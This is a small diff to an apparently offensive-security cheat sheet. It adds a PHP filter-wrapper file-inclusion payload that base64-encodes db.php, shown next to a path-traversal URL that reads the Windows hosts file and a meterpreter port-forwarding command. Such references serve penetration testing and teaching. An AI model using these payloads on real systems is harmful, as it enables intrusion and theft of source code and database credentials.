@@ -953,6 +953,7 @@ meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.110
 
 ```
 http://<domain name>/<page>?page=../../../../../../../../windows/system32/drivers/etc/hosts
+http://<domain name>/blog.php?article=php://filter/convert.base64-encode/resource=db.php
 ```
 
 - Remote File Inclusion (RFI)
